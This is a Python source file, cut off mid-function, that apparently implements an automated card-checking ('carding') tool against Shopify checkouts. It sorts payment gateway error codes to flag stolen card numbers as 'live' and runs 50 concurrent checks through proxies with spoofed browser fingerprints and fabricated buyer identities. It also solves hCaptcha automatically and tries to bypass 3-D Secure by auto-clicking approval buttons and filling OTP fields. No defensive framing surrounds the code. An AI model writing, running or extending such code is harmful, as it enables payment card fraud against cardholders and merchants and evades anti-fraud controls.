
import os
import re
import sys
import json
import time
import random
import asyncio
import httpx
import threading as _threading
from datetime import datetime
from urllib.parse import urlparse, quote

try:
    sys.stdout.reconfigure(encoding="utf-8")
except AttributeError:
    pass

# ═══════════════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════════════
USE_API_SOLVER = False
API_SOLVER_TYPE = "nopecha"
NOPECHA_API_KEY = os.environ.get("NOPECHA_API_KEY", "")
CAPTCHA2_API_KEY = os.environ.get("CAPTCHA2_API_KEY", "")
USE_PLAYWRIGHT = True

MIN_PRICE = 10.0
MAX_PRICE = 40.0
PRODUCTS_CACHE_TTL = 60
PRODUCTS_CACHE_MAX = 200
MAX_CONCURRENT_CHECKS = 50          # ← 50 workers batch
_CAPTCHA_MAX_RETRIES = 1

CCN_LIVE_CODES = {
    "INSUFFICIENT_FUNDS", "INSUFFICIENT_FUND",
    "INVALID_CVC", "INCORRECT_CVC", "CVV_FAIL", "INVALID_CVV", "CVV_ERROR",
    "EXPIRED_CARD", "INVALID_EXPIRY",
    "PAYMENTS_CREDIT_CARD_BASE_INSUFFICIENT_FUNDS",
    "PAYMENTS_CREDIT_CARD_BASE_INVALID_CVC",
    "PAYMENTS_CREDIT_CARD_BASE_EXPIRED",
}
APPROVAL_CODES = {
    "PAYMENTS_CREDIT_CARD_BASE_INSUFFICIENT_FUNDS",
    "PAYMENTS_CREDIT_CARD_BASE_INVALID_CVC",
    "PAYMENTS_CREDIT_CARD_BASE_EXPIRED",
}
DECLINE_CODES = {
    "PAYMENTS_CREDIT_CARD_BASE_STOLEN_CARD",
    "PAYMENTS_CREDIT_CARD_BASE_LOST_CARD",
    "PAYMENTS_CREDIT_CARD_BASE_FRAUDULENT",
    "PAYMENTS_CREDIT_CARD_BASE_GENERIC_DECLINE",
    "PAYMENTS_CREDIT_CARD_BASE_DO_NOT_HONOR",
    "PAYMENTS_CREDIT_CARD_BASE_PICKUP_CARD",
    "PAYMENTS_CREDIT_CARD_BASE_INVALID_NUMBER",
    "PAYMENTS_CREDIT_CARD_BASE_INVALID_EXPIRY",
    "PAYMENTS_CREDIT_CARD_BASE_CALL_ISSUER",
    "GENERIC_ERROR",
}
SITE_SKIP_CODES = {
    "BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP",
    "PAYMENTS_PROPOSED_GATEWAY_UNAVAILABLE",
    "PAYMENTS_INVALID_GATEWAY_FOR_DEVELOPMENT_STORE",
    "DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE",
    "DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE",
    "REQUIRED_ARTIFACTS_UNAVAILABLE",
}

# ═══════════════════════════════════════════════════════════════════════
# HTTP CLIENT
# ═══════════════════════════════════════════════════════════════════════
_CURL_CFFI_AVAILABLE = False
try:
    from curl_cffi.requests import AsyncSession as _CurlAsyncSession
    _CURL_CFFI_AVAILABLE = True
    print("[shopify] ✅ curl_cffi loaded")
except ImportError:
    print("[shopify] ⚠️ curl_cffi not installed — using httpx")

_CHROME_TO_IMPERSONATE = {
    "136": "chrome136", "133": "chrome133a", "131": "chrome131",
    "124": "chrome124", "123": "chrome123", "120": "chrome120",
}
_CURL_IMPERSONATE = list(_CHROME_TO_IMPERSONATE.values())

_H2_AVAILABLE = False
try:
    import h2  # noqa
    _H2_AVAILABLE = True
except ImportError:
    pass


class _CurlSessionWrapper:
    def __init__(self, session):
        self._s = session

    @staticmethod
    def _clean_headers(headers):
        if not headers:
            return headers
        cleaned = {}
        for k, v in headers.items():
            if isinstance(v, str):
                cleaned[k] = v.encode("ascii", errors="ignore").decode("ascii")
            else:
                cleaned[k] = v
        return cleaned

    async def get(self, url, **kwargs):
        if "headers" in kwargs:
            kwargs["headers"] = self._clean_headers(kwargs["headers"])
        return await self._s.get(url, **kwargs)

    async def post(self, url, **kwargs):
        if "headers" in kwargs:
            kwargs["headers"] = self._clean_headers(kwargs["headers"])
        return await self._s.post(url, **kwargs)

    async def __aenter__(self):
        return self

    async def __aexit__(self, *args):
        await self._s.close()


def _create_async_client(proxy_url=None, timeout=30.0, chrome_version=None):
    if _CURL_CFFI_AVAILABLE:
        impersonate = (
            _CHROME_TO_IMPERSONATE[chrome_version]
            if chrome_version in _CHROME_TO_IMPERSONATE
            else random.choice(_CURL_IMPERSONATE)
        )
        kw = {"impersonate": impersonate, "allow_redirects": True, "timeout": timeout, "verify": False}
        if proxy_url:
            kw["proxy"] = proxy_url
        return _CurlSessionWrapper(_CurlAsyncSession(**kw))
    client_kw = {
        "follow_redirects": True,
        "timeout": httpx.Timeout(timeout, connect=8.0, read=25.0, write=8.0, pool=5.0),
        "limits": httpx.Limits(max_connections=100, max_keepalive_connections=20),
        "http2": _H2_AVAILABLE,
    }
    if proxy_url:
        client_kw["proxy"] = proxy_url
    return httpx.AsyncClient(**client_kw)


_NETWORK_ERRORS = (
    httpx.RemoteProtocolError, httpx.ConnectError, httpx.ReadTimeout,
    httpx.ProxyError, httpx.ConnectTimeout, httpx.WriteTimeout,
    httpx.TimeoutException, ConnectionResetError, ConnectionAbortedError, OSError,
)
if _CURL_CFFI_AVAILABLE:
    try:
        from curl_cffi.requests.errors import RequestsError as _CurlRequestsError
        _NETWORK_ERRORS = _NETWORK_ERRORS + (_CurlRequestsError,)
    except ImportError:
        pass

# ═══════════════════════════════════════════════════════════════════════
# FINGERPRINTS
# ═══════════════════════════════════════════════════════════════════════
_FP_CHROME_BUILDS = {
    "136": "136.0.7103.93", "133": "133.0.6943.126",
    "131": "131.0.6778.85", "124": "124.0.6367.118",
    "123": "123.0.6312.86", "120": "120.0.6099.109",
}
_FP_CHROME_WIN = [
    f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{b} Safari/537.36"
    for b in _FP_CHROME_BUILDS.values()
]
_FP_CHROME_MAC = [
    f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{b} Safari/537.36"
    for b in _FP_CHROME_BUILDS.values()
]
_FP_CHROME_ANDROID = [
    f"Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{b} Mobile Safari/537.36"
    for b in _FP_CHROME_BUILDS.values()
]
_FP_ALL_UAS = _FP_CHROME_WIN + _FP_CHROME_MAC + _FP_CHROME_ANDROID

_FP_ACCEPT_LANGS = [
    "en-US,en;q=0.9", "en-US,en;q=0.9,es;q=0.8", "en-US,en;q=0.9,fr;q=0.8",
    "en-US,en;q=0.9,de;q=0.8", "en-US,en;q=0.9,pt;q=0.7", "en-GB,en;q=0.9",
]
_FP_CHROME_BRANDS_MAP = {
    "136": ('"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
            '"Chromium";v="136.0.7103.93", "Google Chrome";v="136.0.7103.93", "Not.A/Brand";v="99.0.0.0"'),
    "133": ('"Not?A_Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
            '"Not?A_Brand";v="99.0.0.0", "Google Chrome";v="133.0.6943.126", "Chromium";v="133.0.6943.126"'),
    "131": ('"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            '"Google Chrome";v="131.0.6778.85", "Chromium";v="131.0.6778.85", "Not_A Brand";v="24.0.0.0"'),
    "124": ('"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            '"Chromium";v="124.0.6367.118", "Google Chrome";v="124.0.6367.118", "Not-A.Brand";v="99.0.0.0"'),
    "123": ('"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
            '"Google Chrome";v="123.0.6312.86", "Not:A-Brand";v="8.0.0.0", "Chromium";v="123.0.6312.86"'),
    "120": ('"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.109", "Google Chrome";v="120.0.6099.109"'),
}
_FP_VIEWPORTS = ["1920x1080", "1366x768", "1536x864", "1440x900", "1280x720", "2560x1440", "1600x900"]
_FP_ACCEPTS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
]
_RE_CHROME_VER = re.compile(r"Chrome/(\d+)")


def _build_fingerprint():
    ua = random.choice(_FP_ALL_UAS)
    m = _RE_CHROME_VER.search(ua)
    chrome_ver = m.group(1) if m else "136"
    ch_ua, ch_ua_full = _FP_CHROME_BRANDS_MAP.get(chrome_ver, _FP_CHROME_BRANDS_MAP["136"])
    if "Android" in ua or "Mobile" in ua:
        platform, mobile = '"Android"', "?1"
    elif "Macintosh" in ua or "Mac OS" in ua:
        platform, mobile = '"macOS"', "?0"
    else:
        platform, mobile = '"Windows"', "?0"
    fp = {
        "_chrome_ver": chrome_ver,
        "User-Agent": ua,
        "Accept-Language": random.choice(_FP_ACCEPT_LANGS),
        "Accept": random.choice(_FP_ACCEPTS),
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive",
        "Priority": "u=0, i",
        "viewport": random.choice(_FP_VIEWPORTS),
        "screen-depth": random.choice(["24", "32"]),
        "Sec-Ch-Ua": ch_ua,
        "Sec-Ch-Ua-Mobile": mobile,
        "Sec-Ch-Ua-Platform": platform,
    }
    if random.random() < 0.5:
        fp["Sec-Ch-Ua-Full-Version-List"] = ch_ua_full
    if random.random() < 0.2:
        fp["DNT"] = "1"
    return fp


def get_random_fingerprint():
    return _build_fingerprint()

# ═══════════════════════════════════════════════════════════════════════
# PROXY HELPERS
# ═══════════════════════════════════════════════════════════════════════
def format_proxy(proxy_string):
    if not proxy_string or not proxy_string.strip():
        return None
    s = proxy_string.strip()
    if s.startswith(("http://", "https://", "socks4://", "socks5://")):
        return s
    if "@" in s:
        auth, host_port = s.split("@", 1)
        return f"http://{auth}@{host_port}"
    if ":" in s:
        parts = s.split(":")
        if len(parts) >= 4:
            host, port, user, pwd = parts[0], parts[1], ":".join(parts[2:-1]), parts[-1]
            if port.isdigit():
                return f"http://{quote(user, safe='')}:{quote(pwd, safe='')}@{host}:{port}"
        if len(parts) == 2 and parts[1].isdigit():
            return f"http://{parts[0]}:{parts[1]}"
    return None


def load_proxy_list(source):
    if not source or not source.strip():
        return []
    s = source.strip()
    if s.lower().startswith("file:"):
        path = s[5:].strip()
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                lines = [line.strip() for line in f if line.strip()]
            return [p for line in lines for p in [format_proxy(line)] if p]
        except Exception as e:
            print(f"   ⚠️  Could not load proxy file: {e}")
            return []
    return [p for part in s.split(",") for p in [format_proxy(part.strip())] if p]

# ═══════════════════════════════════════════════════════════════════════
# REGEX + HELPERS
# ═══════════════════════════════════════════════════════════════════════
_RE_SESSION_TOKEN = re.compile(r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"')
_RE_DELIVERY_LINE_1 = re.compile(r'"deliveryLineStableId"\s*:\s*"([^"]+)"')
_RE_DELIVERY_LINE_2 = re.compile(r'"deliveryGroupStableId"\s*:\s*"([^"]+)"')
_RE_DELIVERY_LINE_3 = re.compile(r"deliveryLineStableId['\"]\s*:\s*['\"]([^'\"]+)['\"]")
_RE_DELIVERY_LINE_4 = re.compile(r'deliveryLines&quot;:\[\{&quot;stableId&quot;:&quot;([^&]+)&quot;')
_RE_DELIVERY_LINE_5 = re.compile(r'"deliveryLines"\s*:\s*\[\s*\{\s*"stableId"\s*:\s*"([^"]+)"')
_RE_DELIVERY_METHOD = re.compile(r'deliveryMethodTypes&quot;:\[&quot;([^&]+)&quot;')
_RE_DELIVERY_METHOD_2 = re.compile(r'"deliveryMethodTypes"\s*:\s*\[\s*"([^"]+)"')
_RE_DELIVERY_STRATEGY = re.compile(r'"selectedDeliveryStrategy"\s*:\s*\{\s*"handle"\s*:\s*"([^"]+)"')

_FALLBACK_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Safari/537.36"

_HEADER_FILTER_FULL = frozenset({
    "user-agent", "accept", "accept-language", "accept-encoding",
    "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform", "sec-ch-ua-full-version-list",
    "sec-fetch-dest", "sec-fetch-mode", "sec-fetch-site", "sec-fetch-user",
    "upgrade-insecure-requests", "cache-control", "connection", "priority",
})
_HEADER_FILTER_SMALL = frozenset({
    "user-agent", "accept", "accept-language",
    "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
})


def find_between(s, start, end):
    try:
        i = s.find(start)
        if i == -1:
            return ""
        i += len(start)
        j = s.find(end, i)
        return s[i:j] if j != -1 else ""
    except Exception:
        return ""


def _extract_delivery_line_stable_id(html_text):
    if not html_text:
        return None
    v = find_between(html_text, 'deliveryLineStableId&quot;:&quot;', '&quot;')
    if v:
        return v
    v = find_between(html_text, 'deliveryGroupStableId&quot;:&quot;', '&quot;')
    if v:
        return v
    for rx in (_RE_DELIVERY_LINE_1, _RE_DELIVERY_LINE_2, _RE_DELIVERY_LINE_3,
               _RE_DELIVERY_LINE_4, _RE_DELIVERY_LINE_5):
        m = rx.search(html_text)
        if m:
            return m.group(1)
    return None


def _detect_requires_shipping(html_text):
    if not html_text:
        return None
    m = _RE_DELIVERY_METHOD.search(html_text)
    if m:
        return m.group(1) != 'NONE'
    m = _RE_DELIVERY_METHOD_2.search(html_text)
    if m:
        return m.group(1) != 'NONE'
    if 'requiresShipping&quot;:false' in html_text or '"requiresShipping":false' in html_text:
        return False
    if 'requiresShipping&quot;:true' in html_text or '"requiresShipping":true' in html_text:
        return True
    return None


def _extract_delivery_strategy_handle(html_text):
    if not html_text:
        return None
    v = find_between(html_text, 'selectedDeliveryStrategy&quot;:{&quot;handle&quot;:&quot;', '&quot;')
    if v:
        return v
    m = _RE_DELIVERY_STRATEGY.search(html_text)
    if m:
        return m.group(1)
    return None


def classify_ccn_live(code):
    if not code:
        return None
    c = str(code).upper()
    if c in CCN_LIVE_CODES:
        return "CCN_LIVE"
    return None


def _is_captcha_result(result):
    if not result or not isinstance(result, dict):
        return False
    code = str(result.get("error_code", "")).upper()
    msg = str(result.get("message", "")).upper()
    return "CAPTCHA" in code or "CAPTCHA" in msg or "CHECKPOINT" in code


def _log_verbose(verbose, msg):
    if not verbose:
        return
    important_keywords = [
        "Result:", "CAPTCHA", "Timeout", "Error", "Declined", "Approved",
        "Charged", "Failed", "3DS", "CARD_DECLINED", "GENERIC_ERROR",
        "✅", "⚠️", "❌", "💰",
    ]
    if any(k in msg for k in important_keywords):
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")

# ═══════════════════════════════════════════════════════════════════════
# PRODUCTS CACHE
# ═══════════════════════════════════════════════════════════════════════
_products_cache = {}
_products_cache_lock = _threading.Lock()


def _get_cached_products(site_url):
    entry = _products_cache.get(site_url)
    if entry and time.time() - entry["ts"] < PRODUCTS_CACHE_TTL:
        return entry["data"]
    return None


def _set_cached_products(site_url, products):
    _products_cache[site_url] = {"data": products, "ts": time.time()}
    if len(_products_cache) > PRODUCTS_CACHE_MAX:
        now = time.time()
        stale = [k for k, v in _products_cache.items() if now - v["ts"] > PRODUCTS_CACHE_TTL]
        for k in stale:
            _products_cache.pop(k, None)

# ═══════════════════════════════════════════════════════════════════════
# CONCURRENCY
# ═══════════════════════════════════════════════════════════════════════
_check_semaphore = None
_active_checks = 0


def get_active_checks():
    return _active_checks

# ═══════════════════════════════════════════════════════════════════════
# BANNER JS
# ═══════════════════════════════════════════════════════════════════════
XCBC_BANNER_JS = """
(function() {
    if (document.getElementById('xcbc-banner')) return;
    var banner = document.createElement('div');
    banner.id = 'xcbc-banner';
    banner.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:2147483647;' +
        'background:linear-gradient(135deg,#00d97e,#00a85e);color:#fff;' +
        'font-family:-apple-system,BlinkMacSystemFont,Segoe UI,sans-serif;' +
        'padding:10px 16px;box-shadow:0 2px 12px rgba(0,217,126,0.4);' +
        'display:flex;align-items:center;justify-content:space-between;';
    var left = document.createElement('div');
    left.style.cssText = 'display:flex;align-items:center;gap:10px;font-weight:800;';
    left.innerHTML = '<span style="font-size:20px;">⚡</span>' +
        '<span style="letter-spacing:0.5px;">X CBC AUTOMATION</span>' +
        '<span style="font-size:11px;opacity:0.85;font-weight:600;">v1.1.0</span>';
    var badge = document.createElement('span');
    badge.style.cssText = 'background:rgba(255,255,255,0.25);padding:4px 10px;' +
        'border-radius:12px;font-size:11px;font-weight:700;letter-spacing:0.5px;';
    badge.textContent = 'INJECTED ✓';
    var right = document.createElement('div');
    right.style.cssText = 'display:flex;align-items:center;gap:12px;font-size:12px;font-weight:600;';
    right.innerHTML = '<span>Shopify Checkout</span>';
    banner.appendChild(left);
    banner.appendChild(badge);
    banner.appendChild(right);
    document.documentElement.appendChild(banner);
    document.body.style.paddingTop = '48px';
    document.body.style.transition = 'padding-top 0.3s ease';
})();
"""

# ═══════════════════════════════════════════════════════════════════════
# CAPTCHA SOLVERS
# ═══════════════════════════════════════════════════════════════════════
async def solve_hcaptcha_playwright(url, proxy_url=None, timeout=60):
    if not USE_PLAYWRIGHT:
        return {"solved": False, "error": "playwright_disabled"}
    try:
        from playwright.async_api import async_playwright
    except ImportError:
        return {"solved": False, "error": "playwright not installed"}
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(
                headless=True,
                args=["--disable-blink-features=AutomationControlled"],
            )
            ctx = await browser.new_context(
                proxy={"server": proxy_url} if proxy_url else None,
                viewport={"width": 1920, "height": 1080},
                user_agent=_FALLBACK_UA,
            )
            page = await ctx.new_page()
            await page.goto(url, wait_until="domcontentloaded", timeout=timeout * 1000)
            try:
                await page.evaluate(XCBC_BANNER_JS)
            except Exception:
                pass
            solved = False
            for _ in range(45):
                ta = await page.evaluate("document.querySelector('textarea[name=\"h-captcha-response\"]')?.value || ''")
                if ta and len(ta) > 10:
                    solved = True
                    break
                try:
                    await page.evaluate("""
                        (() => {
                            const cb = document.querySelector('#anchor, div.check, iframe[src*="hcaptcha.com"]');
                            if (!cb) return;
                            ['mouseover','mousedown','mouseup','click'].forEach(t => {
                                cb.dispatchEvent(new MouseEvent(t, {bubbles:true}));
                            });
                        })()
                    """)
                except Exception:
                    pass
                await asyncio.sleep(1)
            await browser.close()
            return {"solved": solved, "error": None if solved else "timeout"}
    except Exception as e:
        return {"solved": False, "error": str(e)[:200]}


async def solve_hcaptcha_api(url, sitekey, proxy_url=None, timeout=60):
    if API_SOLVER_TYPE == "nopecha":
        if not NOPECHA_API_KEY:
            return {"solved": False, "error": "NOPECHA_API_KEY missing"}
        try:
            async with httpx.AsyncClient(timeout=timeout) as c:
                r = await c.post("https://api.nopecha.com/", json={
                    "key": NOPECHA_API_KEY, "type": "hcaptcha",
                    "sitekey": sitekey, "url": url,
                })
                data = r.json()
                if "data" in data:
                    return {"solved": True, "token": data["data"]}
                return {"solved": False, "error": f"error_{data.get('error')}"}
        except Exception as e:
            return {"solved": False, "error": str(e)[:200]}
    if API_SOLVER_TYPE == "2captcha":
        if not CAPTCHA2_API_KEY:
            return {"solved": False, "error": "CAPTCHA2_API_KEY missing"}
        try:
            async with httpx.AsyncClient(timeout=timeout) as c:
                r = await c.post("https://2captcha.com/in.php", data={
                    "key": CAPTCHA2_API_KEY, "method": "hcaptcha",
                    "sitekey": sitekey, "pageurl": url, "json": 1,
                })
                data = r.json()
                if data.get("status") != 1:
                    return {"solved": False, "error": data.get("request")}
                tid = data["request"]
                for _ in range(30):
                    await asyncio.sleep(3)
                    r2 = await c.get("https://2captcha.com/res.php", params={
                        "key": CAPTCHA2_API_KEY, "action": "get", "id": tid, "json": 1,
                    })
                    d2 = r2.json()
                    if d2.get("status") == 1:
                        return {"solved": True, "token": d2["request"]}
                    if d2.get("request") != "CAPCHA_NOT_READY":
                        return {"solved": False, "error": d2.get("request")}
        except Exception as e:
            return {"solved": False, "error": str(e)[:200]}
    return {"solved": False, "error": "no_solver_available"}

# ═══════════════════════════════════════════════════════════════════════
# 3DS BYPASS
# ═══════════════════════════════════════════════════════════════════════
async def try_3ds_bypass(redirect_url, proxy_url=None, timeout=90):
    if not USE_PLAYWRIGHT:
        return {"bypassed": False, "error": "playwright_disabled"}
    try:
        from playwright.async_api import async_playwright
    except ImportError:
        return {"bypassed": False, "error": "playwright not installed"}
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(
                headless=True,
                args=["--disable-blink-features=AutomationControlled"],
            )
            ctx = await browser.new_context(
                proxy={"server": proxy_url} if proxy_url else None,
                viewport={"width": 1920, "height": 1080},
                user_agent=_FALLBACK_UA,
            )
            page = await ctx.new_page()
            await page.goto(redirect_url, wait_until="domcontentloaded", timeout=timeout * 1000)
            try:
                await page.evaluate(XCBC_BANNER_JS)
            except Exception:
                pass
            approve_selectors = [
                "button:has-text('Approve')", "button:has-text('Confirm')",
                "button:has-text('Submit')", "button:has-text('Continue')",
                "input[type='submit']", "[id*='approve' i]", "[class*='approve' i]",
            ]
            for _ in range(45):
                try:
                    for sel in approve_selectors:
                        try:
                            await page.click(sel, timeout=800)
                            await asyncio.sleep(1)
                        except Exception:
                            continue
                    otp_inputs = await page.query_selector_all("input[type='text'], input[inputmode='numeric']")
                    for inp in otp_inputs:
                        try:
                            await inp.fill("1234")
                        except Exception:
                            pass
                except Exception:
                    pass
                url_lower = page.url.lower()
                if any(x in url_lower for x in ["thank", "success", "complete", "order"]):
                    await browser.close()
                    return {"bypassed": True, "final_url": page.url}
                await asyncio.sleep(2)
            await browser.close()
            return {"bypassed": False, "final_url": page.url}
    except Exception as e:
        return {"bypassed": False, "error": str(e)[:200]}

# ═══════════════════════════════════════════════════════════════════════
# SHOPIFY AUTO
# ═══════════════════════════════════════════════════════════════════════
class ShopifyAuto:
    def __init__(self, fingerprint=None):
        self.user_agent = (fingerprint or {}).get("User-Agent") or _FALLBACK_UA
        self.fingerprint = fingerprint or {}

    def get_random_info(self):
        _POOL_ADDRESSES = (
            {"add1": "123 Main St", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04101"},
            {"add1": "456 Oak Ave", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04102"},
            {"add1": "789 Pine Rd", "city": "Bangor", "state": "Maine", "state_short": "ME", "zip": "04401"},
            {"add1": "321 Elm St", "city": "Lewiston", "state": "Maine", "state_short": "ME", "zip": "04240"},
            {"add1": "1200 Market St", "city": "Wilmington", "state": "Delaware", "state_short": "DE", "zip": "19801"},
            {"add1": "950 Penn Ave", "city": "Dover", "state": "Delaware", "state_short": "DE", "zip": "19901"},
            {"add1": "88 Broad St", "city": "Burlington", "state": "Vermont", "state_short": "VT", "zip": "05401"},
            {"add1": "1425 Broadway", "city": "New York", "state": "New York", "state_short": "NY", "zip": "10018"},
            {"add1": "350 5th Ave", "city": "New York", "state": "New York", "state_short": "NY", "zip": "10118"},
            {"add1": "1600 Vine St", "city": "Los Angeles", "state": "California", "state_short": "CA", "zip": "90028"},
            {"add1": "233 S Wacker Dr", "city": "Chicago", "state": "Illinois", "state_short": "IL", "zip": "60606"},
            {"add1": "1500 Market St", "city": "Philadelphia", "state": "Pennsylvania", "state_short": "PA", "zip": "19102"},
            {"add1": "2000 McKinney Ave", "city": "Dallas", "state": "Texas", "state_short": "TX", "zip": "75201"},
            {"add1": "100 Peachtree St", "city": "Atlanta", "state": "Georgia", "state_short": "GA", "zip": "30303"},
            {"add1": "701 Brickell Ave", "city": "Miami", "state": "Florida", "state_short": "FL", "zip": "33131"},
            {"add1": "1201 3rd Ave", "city": "Seattle", "state": "Washington", "state_short": "WA", "zip": "98101"},
        )
        _POOL_FIRST_NAMES = (
            "John", "Emily", "Alex", "Sarah", "Michael", "Jessica", "David", "Lisa",
            "James", "Jennifer", "Robert", "Amanda", "Daniel", "Ashley", "Matthew",
            "Megan", "Andrew", "Lauren", "Ryan", "Rachel", "Joshua", "Stephanie",
            "Jacob", "Hannah", "Ethan", "Olivia", "Noah", "Sophia", "Liam", "Emma",
        )
        _POOL_LAST_NAMES = (
            "Smith", "Johnson", "Williams", "Brown", "Garcia", "Miller", "Davis",
            "Martinez", "Anderson", "Taylor", "Thomas", "Jackson", "White",
            "Harris", "Clark", "Lewis", "Robinson", "Walker", "Young",
        )
        _POOL_EMAIL_DOMAINS = (
            "gmail.com", "yahoo.com", "outlook.com", "icloud.com",
            "hotmail.com", "aol.com", "protonmail.com", "mail.com",
        )
        _POOL_PHONES = (
            "2025550199", "3105551234", "4155559876", "6175550123",
            "9718081573", "2125559999", "7735551212", "4085556789",
        )
        a = random.choice(_POOL_ADDRESSES)
        fn = random.choice(_POOL_FIRST_NAMES)
        ln = random.choice(_POOL_LAST_NAMES)
        email = f"{fn.lower()}.{ln.lower()}{random.randint(1, 9999)}@{random.choice(_POOL_EMAIL_DOMAINS)}"
        return {
            "fname": fn, "lname": ln, "email": email,
            "phone": random.choice(_POOL_PHONES),
            "add1": a["add1"], "city": a["city"],
            "state": a["state"], "state_short": a["state_short"], "zip": a["zip"],
        }

# ═══════════════════════════════════════════════════════════════════════
# DELIVERY PAYLOAD
# ═══════════════════════════════════════════════════════════════════════
def _build_delivery_payload(stable_id, delivery_line_stable_id, add1, city, zip_code, fname, lname, state_short, phone, destination_changed=True, delivery_option_handle=None, requires_shipping=True, delivery_strategy_handle=None):
    if not requires_shipping:
        line = {
            "selectedDeliveryStrategy": {
                "deliveryStrategyMatchingConditions": {
                    "estimatedTimeInTransit": {"any": True},
                    "shipments": {"any": True},
                },
                "options": {},
            },
            "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
            "deliveryMethodTypes": ["NONE"],
            "expectedTotalPrice": {"any": True},
            "destinationChanged": False,
        }
        if delivery_line_stable_id:
            line["stableId"] = delivery_line_stable_id
        return {
            "deliveryLines": [line],
            "noDeliveryRequired": [],
            "useProgressiveRates": False,
            "prefetchShippingRatesStrategy": None,
        }
    strategy = {"deliveryStrategyMatchingConditions": {"estimatedTimeInTransit": {"any": True}, "shipments": {"any": True}}, "options": {}}
    if delivery_option_handle:
        strategy = {
            "selectedDeliveryOptions": [{"handle": delivery_option_handle}],
            "deliveryStrategyMatchingConditions": {"estimatedTimeInTransit": {"any": True}, "shipments": {"any": True}},
            "options": {},
        }
    line = {
        "selectedDeliveryStrategy": strategy,
        "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
        "destination": {"streetAddress": {"address1": add1, "address2": "", "city": city, "countryCode": "US", "postalCode": zip_code, "company": "", "firstName": fname, "lastName": lname, "zoneCode": state_short, "phone": phone}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {"any": True},
        "destinationChanged": destination_changed,
    }
    if delivery_line_stable_id:
        line["stableId"] = delivery_line_stable_id
    return {
        "deliveryLines": [line],
        "noDeliveryRequired": [],
        "useProgressiveRates": False,
        "prefetchShippingRatesStrategy": None,
    }

# ═══════════════════════════════════════════════════════════════════════
# QUERIES
# ═══════════════════════════════════════════════════════════════════════
_POLL_QUERY = "query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}"

_SUBMIT_QUERY = "mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}"

# ═══════════════════════════════════════════════════════════════════════
# WAITING_PENDING_TERMS BYPASS ATTEMPT
# ═══════════════════════════════════════════════════════════════════════
async def _attempt_terms_bypass(session, graphql_url, graphql_headers, original_payload, site_url, shop, verbose=True):
    """
    Attempt to bypass WAITING_PENDING_TERMS by:
    1. Fetching checkout page to find terms acceptance token/field
    2. Resubmitting with modified payload (destinationChanged=False, refreshed session)
    3. If terms checkbox exists in HTML, attempt to extract accept token
    """
    _log_verbose(verbose, "[terms] ⚡ WAITING_PENDING_TERMS detected — attempting bypass...")
    import copy
    try:
        # Refresh session tokens from checkout page
